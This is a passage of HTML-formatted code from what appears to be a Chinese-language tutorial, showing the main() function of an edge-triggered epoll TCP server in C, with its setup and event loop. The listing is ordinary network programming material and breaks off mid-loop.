color:rgb(0,130,0); background-color:inherit">//端口由参数argv[1]指定</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="datatypes" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">int</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">main (<span class="datatypes" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">int</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> argc, </span><span class="datatypes" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">char</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> *argv[])  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">{  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="datatypes" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">int</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> sfd, s;  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="datatypes" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">int</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> efd;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> epoll_event event;  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> epoll_event *events;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (argc != 2)  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    {  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      fprintf (stderr, <span class="string" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">"Usage: %s [port]\n"</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">, argv[0]);  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      exit (EXIT_FAILURE);  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    }  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  sfd = create_and_bind (argv[1]);  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (sfd == -1)  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    abort ();  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  s = make_socket_non_blocking (sfd);  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (s == -1)  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    abort ();  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  s = listen (sfd, SOMAXCONN);  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (s == -1)  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    {  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      perror (<span class="string" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">"listen"</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">);  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      abort ();  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    }  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//除了参数size被忽略外,此函数和epoll_create完全相同</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  efd = epoll_create1 (0);  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (efd == -1)  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    {  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      perror (<span class="string" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">"epoll_create"</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">);  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      abort ();  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    }  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  event.data.fd = sfd;  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  event.events = EPOLLIN | EPOLLET;<span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//读入,边缘触发方式</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  s = epoll_ctl (efd, EPOLL_CTL_ADD, sfd, &amp;event);  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (s == -1)  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    {  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      perror (<span class="string" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">"epoll_ctl"</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">);  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      abort ();  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    }  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* Buffer where events are returned */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  events = calloc (MAXEVENTS, <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">sizeof</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> event);  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* The event loop */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">while</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (1)  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    {  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      <span class="datatypes" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">int</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> n, i;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      n = epoll_wait (efd, events, MAXEVENTS, -1);  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">      <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">for</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (i = 0; i &lt; n; i++)  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">        {  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">          <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> ((events[i].events &amp; EPOLLERR) ||  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">              (events[i].events &amp; EPOLLHUP) ||  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">              (!(events[i].events &amp; EPOLLIN)))  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">            {  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">              <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* An error has occured on this fd, or the socket is not</span> </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">                 ready for reading (why were we notified then?) */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">              fprintf (stderr, <span class="string" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">"epoll error\n"</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">);  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">              close (events[i].data.fd);  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">              <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">continue</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">;  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">            }  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">          <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">else</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> </span><span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (sfd == events[i].data.fd)  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">            {  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">              <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* We have a notification on the listening socket, which</span> </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">                 means one or more incoming connections. */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">              <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">while</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (1)  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                {  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> 